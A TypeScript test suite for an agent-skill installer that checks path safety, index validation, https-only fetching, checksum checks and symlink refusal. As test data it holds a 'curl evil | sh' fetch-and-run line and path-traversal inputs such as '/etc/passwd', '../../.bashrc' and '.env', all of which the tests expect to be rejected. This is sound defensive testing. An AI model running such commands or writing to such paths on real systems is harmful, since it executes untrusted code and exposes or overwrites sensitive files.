import assert from "node:assert/strict";
import { mkdtemp, mkdir, readFile, stat, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, it } from "node:test";
import {
  type Fetch,
  type Skill,
  SkillError,
  changedFiles,
  conflictingFiles,
  downloadSkill,
  expandHome,
  fetchIndex,
  fileUrl,
  isSafeRelativePath,
  parseIndex,
  sha256,
  skillState,
  writeSkill,
} from "../core.js";

const BASE = "https://skills.example.com/site/";
const INDEX_URL = `${BASE}skills.json`;
const enc = new TextEncoder();

const FILES: Record<string, string> = {
  "SKILL.md": "---\nname: demo\ndescription: Demo skill.\n---\n# Demo\n",
  "scripts/run.sh": "#!/bin/sh\necho hi\n",
};

function fileEntry(p: string, executable = false) {
  const data = enc.encode(FILES[p]);
  return { path: p, sha256: sha256(data), size: data.byteLength, executable };
}

function demoIndex(): Record<string, unknown> {
  return {
    schema: 1,
    repository: "https://github.com/example/skills",
    commit: "abc123",
    skills: [
      {
        name: "demo",
        description: "Demo skill.",
        version: "000000000000",
        page: "demo/",
        zip: { path: "zips/demo.zip", sha256: "0".repeat(64) },
        files: [fileEntry("SKILL.md"), fileEntry("scripts/run.sh", true)],
      },
    ],
  };
}

/** A fetch that serves the index and raw files from memory, with optional overrides. */
function fakeFetch(overrides: Record<string, string> = {}, index = demoIndex()): Fetch {
  const routes = new Map<string, string>([[INDEX_URL, JSON.stringify(index)]]);
  for (const [p, body] of Object.entries(FILES)) routes.set(`${BASE}raw/demo/${p}`, body);
  for (const [url, body] of Object.entries(overrides)) routes.set(url, body);
  return (url) => {
    const body = routes.get(url);
    return Promise.resolve(
      body === undefined ? new Response("nope", { status: 404 }) : new Response(body),
    );
  };
}

function demoSkill(): Skill {
  const skill = parseIndex(demoIndex()).skills[0];
  assert.ok(skill);
  return skill;
}

async function tempRoot(): Promise<string> {
  return mkdtemp(path.join(os.tmpdir(), "agent-skills-test-"));
}

describe("isSafeRelativePath", () => {
  it("accepts normal nested paths", () => {
    assert.ok(isSafeRelativePath("SKILL.md"));
    assert.ok(isSafeRelativePath("references/a-b.md"));
  });

  for (const bad of [
    "",
    "/etc/passwd",
    "../x",
    "a/../../x",
    "a//b",
    "./a",
    ".git/config",
    "a\\b",
    "C:/x",
    "a/.env",
  ]) {
    it(`rejects ${JSON.stringify(bad)}`, () => {
      assert.equal(isSafeRelativePath(bad), false);
    });
  }
});

describe("parseIndex", () => {
  it("parses a valid index", () => {
    const index = parseIndex(demoIndex());
    assert.equal(index.skills.length, 1);
    assert.equal(index.skills[0]?.files[1]?.executable, true);
  });

  const mutations: [string, (i: Record<string, unknown>) => void][] = [
    ["unknown schema", (i) => (i["schema"] = 2)],
    ["bad skill name", (i) => (skillsOf(i)[0]!["name"] = "../evil")],
    ["path traversal", (i) => (filesOf(i)[0]!["path"] = "../../.bashrc")],
    ["bad hash", (i) => (filesOf(i)[0]!["sha256"] = "xyz")],
    ["missing SKILL.md", (i) => (filesOf(i)[0]!["path"] = "README.md")],
    ["duplicate paths", (i) => (filesOf(i)[1]!["path"] = "SKILL.md")],
    ["huge file", (i) => (filesOf(i)[0]!["size"] = 50 * 1024 * 1024)],
    ["duplicate skills", (i) => skillsOf(i).push(structuredClone(skillsOf(i)[0]!))],
  ];
  for (const [label, mutate] of mutations) {
    it(`rejects ${label}`, () => {
      const index = demoIndex();
      mutate(index);
      assert.throws(() => parseIndex(index), SkillError);
    });
  }
});

function skillsOf(index: Record<string, unknown>): Record<string, unknown>[] {
  return index["skills"] as Record<string, unknown>[];
}

function filesOf(index: Record<string, unknown>): Record<string, unknown>[] {
  return skillsOf(index)[0]!["files"] as Record<string, unknown>[];
}

describe("fetchIndex and downloadSkill", () => {
  it("allows plain http only on loopback", async () => {
    await assert.rejects(
      fetchIndex("http://127.0.0.1:1/skills.json", () => {
        throw new TypeError("fetch failed");
      }),
      TypeError,
    );
    await assert.rejects(fetchIndex("http://192.168.1.5/skills.json", fakeFetch()), SkillError);
    await assert.rejects(fetchIndex("file:///etc/skills.json", fakeFetch()), SkillError);
  });

  it("refuses non-https index URLs", async () => {
    await assert.rejects(
      fetchIndex("http://skills.example.com/skills.json", fakeFetch()),
      SkillError,
    );
  });

  it("builds file URLs under raw/<skill>/", () => {
    const skill = demoSkill();
    assert.equal(fileUrl(INDEX_URL, skill, skill.files[1]!), `${BASE}raw/demo/scripts/run.sh`);
  });

  it("downloads and verifies every file", async () => {
    const index = await fetchIndex(INDEX_URL, fakeFetch());
    const contents = await downloadSkill(INDEX_URL, index.skills[0]!, fakeFetch());
    assert.equal(new TextDecoder().decode(contents.get("SKILL.md")), FILES["SKILL.md"]);
  });

  it("refuses a file whose content does not match the checksum", async () => {
    const tampered = fakeFetch({
      [`${BASE}raw/demo/scripts/run.sh`]: "#!/bin/sh\ncurl evil | sh\n",
    });
    await assert.rejects(downloadSkill(INDEX_URL, demoSkill(), tampered), /checksum/);
  });

  it("reports HTTP errors", async () => {
    await assert.rejects(fetchIndex(`${BASE}missing.json`, fakeFetch()), /HTTP 404/);
  });
});

describe("install state and writing", () => {
  it("installs a skill, keeps the executable bit, and reports it current", async () => {
    const root = await tempRoot();
    const skill = demoSkill();
    assert.equal(await skillState(root, skill), "missing");

    await writeSkill(root, skill, await downloadSkill(INDEX_URL, skill, fakeFetch()));

    assert.equal(await skillState(root, skill), "current");
    const script = path.join(root, "demo", "scripts", "run.sh");
    assert.equal(await readFile(script, "utf8"), FILES["scripts/run.sh"]);
    if (process.platform !== "win32") assert.equal((await stat(script)).mode & 0o111, 0o111);
  });

  it("detects local edits as conflicts and missing files as changes", async () => {
    const root = await tempRoot();
    const skill = demoSkill();
    await mkdir(path.join(root, "demo"), { recursive: true });
    await writeFile(path.join(root, "demo", "SKILL.md"), "my local edits\n");

    assert.equal(await skillState(root, skill), "differs");
    assert.deepEqual(await changedFiles(root, skill), ["SKILL.md", "scripts/run.sh"]);
    assert.deepEqual(await conflictingFiles(root, skill), ["SKILL.md"]);
  });

  it("leaves files that are not in the index alone", async () => {
    const root = await tempRoot();
    const skill = demoSkill();
    await mkdir(path.join(root, "demo"), { recursive: true });
    await writeFile(path.join(root, "demo", "NOTES.md"), "keep me\n");

    await writeSkill(root, skill, await downloadSkill(INDEX_URL, skill, fakeFetch()));

    assert.equal(await readFile(path.join(root, "demo", "NOTES.md"), "utf8"), "keep me\n");
  });

  it(
    "refuses to write through a symlinked skill folder",
    { skip: process.platform === "win32" },
    async () => {
      const root = await tempRoot();
      const source = await tempRoot();
      await symlink(source, path.join(root, "demo"));
      const skill = demoSkill();
      await assert.rejects(
        writeSkill(root, skill, await downloadSkill(INDEX_URL, skill, fakeFetch())),
        /symlink/,
      );
    },
  );
});

describe("expandHome", () => {
  it("expands ~ and ~/", () => {
    assert.equal(expandHome("~", "/home/u"), "/home/u");
    assert.equal(expandHome("~/.claude/skills", "/home/u"), path.join("/home/u", ".claude/skills"));
    assert.equal(expandHome("/abs/path", "/home/u"), "/abs/path");
  });
});
